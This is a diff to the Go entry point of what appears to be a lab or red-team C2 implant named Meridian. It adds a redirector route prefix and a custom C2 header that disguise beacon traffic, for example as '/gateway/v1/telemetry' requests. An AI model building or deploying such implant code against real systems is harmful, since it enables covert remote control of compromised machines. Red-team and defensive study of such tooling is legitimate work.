@@ -8,6 +8,11 @@
 //	MERIDIAN_HTTP       base URL, e.g. http://127.0.0.1:8080 (repeatable)
 //	MERIDIAN_DNS        resolver host:port, e.g. 127.0.0.1:5353 (repeatable)
 //	MERIDIAN_DNS_DOMAIN C2 base domain, e.g. c2.test
+//	MERIDIAN_URI_PREFIX redirector route prefix prepended to HTTP API paths,
+//	                     e.g. /gateway/v1/telemetry for the redirector
+//	MERIDIAN_HTTP_HEADER_NAME  C2 header name (default X-Request-ID)
+//	MERIDIAN_HTTP_HEADER_VALUE C2 header value (default cadre-c2; set empty
+//	                     to disable when talking to the backend directly)
 //	MERIDIAN_INTERVAL   seconds between checkins (default 30)
 //	MERIDIAN_JITTER     jitter fraction (default 0.2)
 //	MERIDIAN_INSECURE   skip TLS verification in lab (1)
@@ -69,9 +74,18 @@ func main() {
 	interval := envInt("MERIDIAN_INTERVAL", defaultInterval)
 	jitter := envFloat("MERIDIAN_JITTER", defaultJitter)
 
+	prefix := os.Getenv("MERIDIAN_URI_PREFIX")
+	headerName := os.Getenv("MERIDIAN_HTTP_HEADER_NAME")
+	if headerName == "" {
+		headerName = "X-Request-ID"
+	}
+	headerValue := os.Getenv("MERIDIAN_HTTP_HEADER_VALUE")
+	if headerValue == "" {
+		headerValue = "cadre-c2"
+	}
 	var transports []mtransport.Transport
 	for _, base := range envList("MERIDIAN_HTTP") {
-		transports = append(transports, mtransport.NewHTTP(base, envBool("MERIDIAN_INSECURE"), timeout, interval, jitter))
+		transports = append(transports, mtransport.NewHTTP(base, envBool("MERIDIAN_INSECURE"), timeout, interval, jitter, prefix, headerName, headerValue))
 	}
 	for _, server := range envList("MERIDIAN_DNS") {
 		domain := os.Getenv("MERIDIAN_DNS_DOMAIN")
